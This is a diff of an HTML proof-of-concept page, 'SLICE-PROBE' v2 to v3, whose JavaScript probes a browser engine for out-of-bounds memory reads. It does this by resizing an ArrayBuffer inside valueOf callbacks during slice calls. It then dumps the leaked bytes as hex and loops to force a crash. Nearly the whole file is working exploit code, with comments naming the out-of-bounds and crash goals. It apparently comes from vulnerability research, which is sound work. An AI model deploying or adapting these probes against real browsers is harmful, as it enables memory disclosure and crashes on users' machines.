@@ -1,62 +1,23 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>SLICE-PROBE v2</title>
+<title>SLICE-PROBE v3</title>
 <body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
-<div id=o>[SLICE-PROBE v2]</div>
+<div id=o>[SLICE-PROBE v3]</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>o.textContent+="\n"+m;
-window.addEventListener('error',e=>log("[ERROR] "+e.message));
+window.addEventListener('error',e=>log("[ERROR] "+e.message+" @line "+e.lineno));
 function hd(u,off,n){let s="";for(let i=0;i<n;i++)s+=(u[off+i]===undefined?"??":u[off+i].toString(16).padStart(2,"0"));return s;}
-
-// T1: shrink to 16, copy from near OLD end -> true OOB read region
-try{
-  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});
-  new Uint8Array(ab).fill(0x41);
-  const s=ab.slice({valueOf(){ab.resize(16);return 0xF00;}},{valueOf(){ab.resize(16);return 0x1000;}});
-  const u=new Uint8Array(s);
-  log("T1: slice="+s.byteLength+" [0]="+u[0]+" [0x80]="+u[0x80]+" dump:"+hd(u,0,32));
-}catch(e){log("T1: "+e.name);}
-
-// T2: shrink to 0 -> all reads land past the buffer
-try{
-  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});
-  new Uint8Array(ab).fill(0x41);
-  const s=ab.slice({valueOf(){ab.resize(0);return 0x400;}},{valueOf(){ab.resize(0);return 0x800;}});
-  const u=new Uint8Array(s);
-  let nz=0;for(let i=0;i<u.length;i++)if(u[i]!==0)nz++;
-  log("T2: slice="+s.byteLength+" nonzero="+nz+" dump:"+hd(u,0,32)+":"+hd(u,512,16));
-}catch(e){log("T2: "+e.name);}
-
-// T3: grow during begin, shrink during end (confusion both ways)
-try{
-  const ab=new ArrayBuffer(0x100,{maxByteLength:0x100000});
-  new Uint8Array(ab).fill(0x41);
-  const s=ab.slice({valueOf(){ab.resize(0x40000);return 0;}},{valueOf(){ab.resize(0x20);return 0x40000;}});
-  const u=new Uint8Array(s);
-  log("T3: slice="+s.byteLength+" dump@"+0x200+":"+hd(u,0x200,32));
-}catch(e){log("T3: "+e.name);}
-
-// T4: same confusion via TypedArray.prototype.slice on a view
-try{
-  const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});
-  new Uint8Array(ab).fill(0x41);
-  const v=new Uint8Array(ab);
-  const s=v.slice({valueOf(){ab.resize(16);return 0;}},{valueOf(){ab.resize(16);return 0x1000;}});
-  log("T4: view slice="+s.byteLength+" [0x800]="+s[0x800]+" dump:"+hd(s,0x700,16));
-}catch(e){log("T4: "+e.name);}
-
-// T5: loop the resize(0) variant many times to hit a decommitted page -> crash
-try{
-  for(let i=0;i<50000;i++){
-    const ab=new ArrayBuffer(0x2000,{maxByteLength:0x200000});
-    new Uint8Array(ab).fill(0x41);
-    const s=ab.slice({valueOf(){ab.resize(0);return 0x1000;}},{valueOf(){ab.resize(0);return 0x2000;}});
-    const u=new Uint8Array(s);
-    let nz=0;for(let j=0;j<u.length;j++)if(u[j]!==0)nz++;
-    if(nz>0){log("T5: i="+i+" nonzero="+nz+" dump:"+hd(u,0,24));break;}
-    if((i&0x3FF)===0&&i>0){log("T5: i="+i);await new Promise(r=>setTimeout(r,0));}
-  }
-}catch(e){log("T5: "+e.name);}
+log("[*] start");
+log("[*] T1 begin");
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});new Uint8Array(ab).fill(0x41);const s=ab.slice({valueOf(){ab.resize(16);return 0xF00;}},{valueOf(){ab.resize(16);return 0x1000;}});const u=new Uint8Array(s);log("T1 OK slice="+s.byteLength+" [0]="+u[0]+" dump:"+hd(u,0,32));}catch(e){log("T1 "+e.name);}
+log("[*] T2 begin");
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});new Uint8Array(ab).fill(0x41);const s=ab.slice({valueOf(){ab.resize(0);return 0x400;}},{valueOf(){ab.resize(0);return 0x800;}});const u=new Uint8Array(s);let nz=0;for(let i=0;i<u.length;i++)if(u[i]!==0)nz++;log("T2 OK slice="+s.byteLength+" nonzero="+nz+" dump:"+hd(u,0,32));}catch(e){log("T2 "+e.name);}
+log("[*] T3 begin");
+try{const ab=new ArrayBuffer(0x100,{maxByteLength:0x100000});new Uint8Array(ab).fill(0x41);const s=ab.slice({valueOf(){ab.resize(0x40000);return 0;}},{valueOf(){ab.resize(0x20);return 0x40000;}});const u=new Uint8Array(s);log("T3 OK slice="+s.byteLength+" dump@"+0x200+":"+hd(u,0x200,32));}catch(e){log("T3 "+e.name);}
+log("[*] T4 begin");
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x100000});new Uint8Array(ab).fill(0x41);const v=new Uint8Array(ab);const s=v.slice({valueOf(){ab.resize(16);return 0;}},{valueOf(){ab.resize(16);return 0x1000;}});log("T4 OK view slice="+s.byteLength+" [0x800]="+s[0x800]+" dump:"+hd(s,0x700,16));}catch(e){log("T4 "+e.name);}
+log("[*] T5 begin (loop)");
+try{for(let i=0;i<50000;i++){const ab=new ArrayBuffer(0x2000,{maxByteLength:0x200000});new Uint8Array(ab).fill(0x41);const s=ab.slice({valueOf(){ab.resize(0);return 0x1000;}},{valueOf(){ab.resize(0);return 0x2000;}});const u=new Uint8Array(s);let nz=0;for(let j=0;j<u.length;j++)if(u[j]!==0)nz++;if(nz>0){log("T5 i="+i+" nonzero="+nz+" dump:"+hd(u,0,24));break;}if((i&0x3FF)===0&&i>0){log("T5 i="+i);await new Promise(r=>setTimeout(r,0));}}log("T5 loop end");}catch(e){log("T5 "+e.name);}
 log("DONE");
 </script>
